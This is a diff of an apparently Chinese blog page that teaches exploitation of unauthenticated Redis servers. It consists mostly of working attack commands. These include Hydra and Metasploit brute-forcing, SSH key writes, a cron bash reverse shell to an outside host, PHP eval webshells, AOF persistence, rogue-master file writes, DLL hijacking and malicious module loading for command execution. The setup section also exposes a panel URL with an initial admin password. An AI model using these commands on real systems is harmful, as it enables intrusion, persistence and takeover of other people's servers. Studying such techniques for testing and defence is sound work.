@@ -435,14 +435,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-10-17
+                    2021-10-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4k
+                    4.1k
                 </div>
                 
 
@@ -490,9 +490,9 @@ $ cd src && ./redis-server<span aria-hidden="true" class="line-numbers-rows"><sp
 <p><strong><a target="_blank" rel="noopener" href="https://hub.docker.com/_/redis">dockerhub-redis</a></strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/792704d7190b0d603cb165a695c2f52d.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">docker pull redis:5-bullseye<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9c73d5c602c38d59d9e96092e13ca56e.png"></p>
-<p><strong>Dockerhub-CnetOS</strong>:</p>
+<h3 id="Dockerhub-CentOS"><a href="#Dockerhub-CentOS" class="headerlink" title="Dockerhub-CentOS"></a>Dockerhub-CentOS</h3><p>使用Docker在CentOS容器内部署PHPStudy和Redis环境：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">docker pull centos:latest
-docker run -tid --name centos_1 -p 26379:6379 -p 18080:18080 -p 80:80 -p 9080:9080 -p 22:22 --privileged<span class="token operator">=</span>true centos:latest /sbin/init
+docker run -tid --name centos_1 -p 6379:6379 -p 18080:18080 -p 8081:8080 -p 8082:80 -p 9080:9080 -p 2222:22 --privileged<span class="token operator">=</span>true centos:latest /sbin/init
 yum <span class="token function">install</span> crontabs   <span class="token comment" spellcheck="true">#安装计划任务服务</span>
 systemctl <span class="token function">enable</span> crond <span class="token comment" spellcheck="true">#设为开机启动</span>
 systemctl start crond  <span class="token comment" spellcheck="true">#启动crond服务</span>
@@ -504,22 +504,27 @@ yum <span class="token function">install</span> <span class="token function">wge
 yum <span class="token function">install</span> openssh*
 systemctl <span class="token function">enable</span> sshd 
 systemctl start sshd
-<span class="token comment" spellcheck="true">#phpstudy</span>
+<span class="token comment" spellcheck="true">#phpstudy，内置了很多软件安装</span>
 yum <span class="token function">install</span> -y <span class="token function">wget</span> <span class="token operator">&amp;&amp;</span> <span class="token function">wget</span> -O install.sh https://notdocker.xp.cn/install.sh <span class="token operator">&amp;&amp;</span> sh install.sh
 请用浏览器访问面板:
 外网:http://171.212.137.205:9080/B3A929
 内网:http://172.17.0.3:9080/B3A929
 系统初始账号:admin
 系统初始密码:hLQGQ6HGP9
-官网:https://www.xp.cn
-如果使用的是云服务器，请至安全组开放9080端口
-如果使用ftp，请开放21以及30000-30050端口
-
-<span class="token comment" spellcheck="true">#ssh -fgN -L 8080:localhost:80 localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment" spellcheck="true">#ssh -fgN -L 8080:localhost:80 localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Redis-Install-For-Windows"><a href="#Redis-Install-For-Windows" class="headerlink" title="Redis Install For Windows"></a>Redis Install For Windows</h3><p><a target="_blank" rel="noopener" href="https://github.com/dmajkic/redis/downloads">Redis&lt;2.4.5安装包</a> ， <a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">PHPStudy-Redis3.0.504</a> ， <a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases">Redis-x64-3.2.100.msi</a><br>分别是2.4.5，3.0.504，3.2.100三个版本，启动后为当前用户权限：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a64eea99d9856ecf4545f935aff74ac.png"><br>Redis-x64-3.2.100.msi安装后会以服务形式启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb11327e4b205370d64d7e2b55e1cb7e.png"></p>
-<p><strong>Rdies-cli命令监控</strong></p>
-<pre class="line-numbers language-cmd"><code class="language-cmd">redis-cli -h 192.168.200.97 monitor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h2><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p> <code>CLIENT LIST</code>    #获取客户端连接信息<br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"></p>
+<h2 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h2><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><strong>Dict协议</strong></p>
+<pre class="line-numbers language-html"><code class="language-html">dict://192.168.200.97:6379/auth:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>Metasploit模块</strong></p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">use auxiliary/scanner/redis/redis_login
+set rohosts 192.168.11.133
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9abaff419efd5fc973b2dc0cff95f28.png"></p>
+<p><strong>Hydra</strong></p>
+<pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">hydra</span> -P redis_pass<span class="token operator">.</span>txt redis<span class="token punctuation">:</span></span><span class="token comment" spellcheck="true">//192.168.0.100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/bd5f9c678d6039c2e3f460c025ca20a3.png"></p>
+<p><strong>超级弱口令工具</strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6de20cd9b8d9e90a395bc957b2b20b2a.png"></p>
+<h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p> <code>CLIENT LIST</code>    #获取客户端连接信息<br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"></p>
 <p><code>EVAL "return dofile('C:/Users/yanghao/NTUSER.DAT')" 0</code> #探测文件是否存在(&gt;2.6.0)<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe9fd97c62e0cc0443e241422100b2fc.png" alt="enter description here"></p>
 <pre class="line-numbers language-cmd"><code class="language-cmd">#检测 redis 服务是否启动
 ping
@@ -589,16 +594,16 @@ config set dbfilename authorized_keys
 set authorized_keys "id_rsa.pub的内容"
 bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a88d17df4b2feb84d5ba54c964384dd3.png"><br>查看靶机已经写入成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d71634977764e04614840a94d832ea2d.png"><br>登录成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9a696a39954a3c85bcc4f66dd9d2ad0.png"></p>
-<p><strong>Linux写计划任务(root权限)</strong><br>计划任务介绍：<br><a target="_blank" rel="noopener" href="https://www.thegeekdiary.com/centos-rhel-begginners-guide-to-cron/">https://www.thegeekdiary.com/centos-rhel-begginners-guide-to-cron/</a><br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Cron#crontab%E6%96%87%E4%BB%B6">https://zh.wikipedia.org/wiki/Cron#crontab%E6%96%87%E4%BB%B6</a></p>
+<p><strong>Linux写计划任务</strong><br>Linux下操作计划任务需要root权限。<a target="_blank" rel="noopener" href="https://www.thegeekdiary.com/centos-rhel-begginners-guide-to-cron/">计划任务介绍</a> <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Cron#crontab%E6%96%87%E4%BB%B6">crontab文件</a></p>
 <p><code>/etc/crontab</code>和<code>/etc/cron.*</code>目录下的任务时间表（crontabs）文件是系统层次的，格式如下：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 文件格式說明</span>
-<span class="token comment" spellcheck="true"># ┌──分鐘（0 - 59）</span>
-<span class="token comment" spellcheck="true"># │ ┌──小時（0 - 23）</span>
+<span class="token comment" spellcheck="true"># ┌──分钟（0 - 59）</span>
+<span class="token comment" spellcheck="true"># │ ┌──小时（0 - 23）</span>
 <span class="token comment" spellcheck="true"># │ │ ┌──日（1 - 31）</span>
 <span class="token comment" spellcheck="true"># │ │ │ ┌─月（1 - 12）</span>
 <span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span>
 <span class="token comment" spellcheck="true"># │ │ │ │ │</span>
-<span class="token comment" spellcheck="true"># *  *  *  *  *  用户名 被執行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment" spellcheck="true"># *  *  *  *  *  用户名 执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>系统层次的任务时间表（crontabs）的任务经常会指定一个或以上的用户进行执行，因此任务时间表（crontabs）文件需要增加“用户名”字段。<code>/etc/crontab</code> 文件定期自动执行多个子目录中的项目。放置在不同目录中<code>/etc/cron.*</code>脚本按照下面给出的时间间隔运行。这些目录中的所有脚本都以 root 权限运行。<br>| 目录     | 时间 |<br>|:—–|:—–|<br>| /etc/cron.d  | 几分钟 |<br>| /etc/cron.hourly |每小时的第一分钟 |<br>| /etc/cron.daily | 每天凌晨 3:05 至晚上 10.55 |<br>| /etc/cron.weekly |自上次执行后 7 天后的上午 3:25 至晚上 11:10 之间 |<br>| /etc/cron.monthly | 自上次执行后一个月后的凌晨 3:45 至晚上 11:30 之间 | </p>
 <p><code>/var/spool/cron/</code>下的任务时间表（crontab）文件是用户层次的（但是只能root权限建），计划任务文件的名称与用户的用户名相同，格式如下：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 文件格式說明</span>
@@ -609,7 +614,7 @@ bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></sp
 <span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span>
 <span class="token comment" spellcheck="true"># │ │ │ │ │</span>
 <span class="token comment" spellcheck="true"># *  *  *  *  * 被執行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>由于Ubuntu的计划任务不能容错:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2c504bdb7af9d8e9b5c186a817c25768.png"><br>用Docker搭建了CentOS环境来测试，Redis命令写入计划任务(需要权限)文件夹<code>/etc/cron.d</code>：</p>
+<p>由于Ubuntu的计划任务不能容错，语法会进行严格检查:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2c504bdb7af9d8e9b5c186a817c25768.png"><br>所以写计划任务用到了Docker搭建CentOS环境来测试，Redis命令写入计划任务文件夹<code>/etc/cron.d</code>：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">config <span class="token keyword">set</span> <span class="token function">dir</span> /etc/cron.d
 config <span class="token keyword">set</span> dbfilename x
 <span class="token keyword">set</span> x <span class="token string">"\n\nSHELL=/bin/bash\n\n* * * * * root bash -i >&amp; /dev/tcp/192.168.11.1/6666 0>&amp;1\n\n"</span>
@@ -636,19 +641,25 @@ config set dbfilename check.bat
 set x "\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause > nul\r\n"
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fc91a408ddc88709de58aba050248a44.png"></p>
-<p><strong>WEB绝对路径写Wbeshell</strong><br>如果Redis环境中同时存在WEB环境，尝试获取到绝对路径后写入webshell，Windows+PHPStudy:</p>
+<p><strong>WEB绝对路径写Wbeshell</strong><br>如果Redis环境中同时存在WEB环境，在Redis权限比较高的情况下，可以尝试获取到绝对路径后写入Webshell，一般以二进制文件启动的程序是启动用户的权限，比较适合利用，以安装服务(yum install redis)等启动的权限会比较有限。</p>
+<p>Windows+PHPStudy:</p>
 <pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "D:/phpstudy_pro/WWW" 
 config set dbfilename redisshell.php
 set x "\r\n\r\<?php eval($_GET[1]);?>\r\n\r\n"
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9bae99834a2ca2f2665c1b9b660413d.png"></p>
 <p>在CentOS+PHPStudy下：</p>
-<pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "/www/admin/localhost_80/wwwroot/" 
+<pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "/var/www/html" 
 config set dbfilename redisshell.php
 set x "\n\n<?php eval($_GET[1]);?>\n\n"
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2ef26d7345cd7a1e6e20a88abe52e49e.png"></p>
-<p>Centos + Apache（066？ redis写的shell不读取？）:</p>
+<p>Centos + Apache下:</p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">config set dir "/var/www/html" 
+config set dbfilename redisshell.php
+set x "\n\n<?php eval($_GET[1]);?>\n\n"
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f8df2ca875ec434336e7d9fd60513394.png"><br>如果权限不足，无法写入：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2e23b73f321efe0a5d5a5fbba526a674.png"></p>
 <h4 id="AOF-配置重写持久化"><a href="#AOF-配置重写持久化" class="headerlink" title="AOF+配置重写持久化"></a>AOF+配置重写持久化</h4><p>由于不能设置appendfilename参数，不能AOF写任意后缀文件。但是可以通过该方式进行权限维持，在配置文件开启AOF后，Redis在重启后会执行其中的命令以恢复数据，结合配置文件重写达到redis在重启后写入webshell的效果(save之类的命令不会被aof记录)，执行命令：</p>
 <pre class="line-numbers language-cmd"><code class="language-cmd">#每秒保存命令（如果已经在默认位置存在aof文件，就使用该配置保存命令，不要使用bgrewriteaof，redis会优先恢复默认目录的aof,用该命令控制写入aof的内容即可。）
 #config set appendfsync everysec
@@ -673,10 +684,7 @@ config set appendonly yes
  #重写配置
 CONFIG REWRITE                       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>由于在10秒内设置了key,触发保存规则，写入了PHP文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f89cc1a5cae127346a6582c753dea373.png"><br>模拟管理员删除PHP文件、然后重启Redis、Redis工作后的键写入:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/db05612d3c4eae8e9499a12e2bf884d5.gif"></p>
-<h3 id="ACL文件"><a href="#ACL文件" class="headerlink" title="ACL文件"></a>ACL文件</h3><blockquote>
-<p>6.0 aclfile ACL SAVE</p>
-</blockquote>
-<h3 id="主从复制无损写文件-master-slave模式"><a href="#主从复制无损写文件-master-slave模式" class="headerlink" title="主从复制无损写文件(master/slave模式)"></a>主从复制无损写文件(master/slave模式)</h3><p>通过主从复制，master 会将内存数据通过 bgsave 落地到 rdb，从而同步给slave。攻击者可以伪造一个master，保存到rdb的数据可以自行控制，这样就没有附加的额外数据，落地无损的文件。利用命令来设置主服务器<code>SLAVEOF host port / REPLICAOF host port</code>(REPLICAOF &gt; 5.0.0) ，执行命令后的Redis身份会切换为从服务器，然后通过与主服务器交互进行数据同步(会导致目标Redis数据丢失)。使用 <a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 脚本模拟master测试利用(需要网络互通,否则脚本会卡在从机连接位置)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/44800dff8965ebaa84c88b226962fb81.png"></p>
+<h3 id="主从复制无损写文件-master-slave模式"><a href="#主从复制无损写文件-master-slave模式" class="headerlink" title="主从复制无损写文件(master/slave模式)"></a>主从复制无损写文件(master/slave模式)</h3><p>通过主从复制，master 会将内存数据通过 bgsave 落地到 rdb，从而同步给slave。攻击者可以伪造一个master，保存到rdb的数据可以自行控制，这样就没有附加的额外数据，落地无损的文件。利用命令来设置主服务器<code>SLAVEOF host port / REPLICAOF host port</code>(REPLICAOF &gt; 5.0.0) ，执行命令后的Redis身份会切换为从服务器，然后通过与主服务器交互进行数据同步，但是会导致目标Redis数据丢失，可以使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yanjieli/p/13085481.html">redis-dump</a>、redis-load等第三方工具进行数据备份导出，也可以在目标Redis上设置rdb、aof备份。利用 <a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 脚本模拟master测试利用(需要网络互通,否则脚本会卡在从机连接位置)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/44800dff8965ebaa84c88b226962fb81.png"></p>
 <p><strong>Linux写SSH公钥</strong></p>
 <pre class="line-numbers language-cmd"><code class="language-cmd">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/root/.ssh" --rfile authorized_keys --lfile ./SSH/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/85962012cf8bcebde873f98e9707d9eb.png"></p>
@@ -704,12 +712,15 @@ EVAL "return dofile('C:/Users/Public/Desktop/Notepad++.lnk')" 0<span aria-hidden
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e4db3f27a21559bd617154e98f92969c.png"><br>6.使用Redis主从同步脚本写入后执行<code>bgsave</code>触发DLL劫持：</p>
 <pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"D:/phpstudy_pro/Extensions/redis3.0.504"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile <span class="token string">"dbghelp.dll"</span> <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token string">"dbghelp.dll"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/188376a7149dc5dbc46e0a67415437cc.gif"></p>
-<h3 id="Redis恶意模块"><a href="#Redis恶意模块" class="headerlink" title="Redis恶意模块"></a>Redis恶意模块</h3><p>同样是利用主从复制写入文件，但是提供了模块支持，可以使用loadn xxx加载模板，然后通过模块扩展进行命令执行等操作，类似MySQL的UDF</p>
-<p>MODULE LOAD </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>
-<p>set 1234 123<br>key *<br>get 1234<br>2.主从复制<br>SLAVEOF 192.168.11.133 6379 </p>
-<p>3.主从复制RCE , 扩展加载<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a><br>docker search redis5.0    //查找镜像<br>docker pull damonevking/redis5.0   //拉取下图第三个镜像</p>
-<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br>备份redis数据：<br><a target="_blank" rel="noopener" href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a></p>
+<h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在Redis4.0或更高版本中，支持了自定义<a target="_blank" rel="noopener" href="https://redis.io/modules">模块</a>，可以编写模块来执行命令，GitHub项目<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>。<br>利用主从复制写入文件后使用<code>module load xx.so</code>加载，通过模块扩展进行命令执行等操作，类似MySQL的UDF。操作命令如下:</p>
+<pre class="line-numbers language-cmd"><code class="language-cmd">config set dir /tmp
+config set dbfilename system.so
+slaveof 192.168.11.1 16379  
+module load /tmp/exp.so
+slaveof no one 
+system.exec 'id'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用RedisWriteFile脚本增加自动命令执行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p>
+<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a target="_blank" rel="noopener" href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1371,7 +1382,7 @@ EVAL "return dofile('C:/Users/Public/Desktop/Notepad++.lnk')" 0<span aria-hidden
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">26.3k</span>&nbsp;字
+                class="white-color">26.4k</span>&nbsp;字
             
             
             
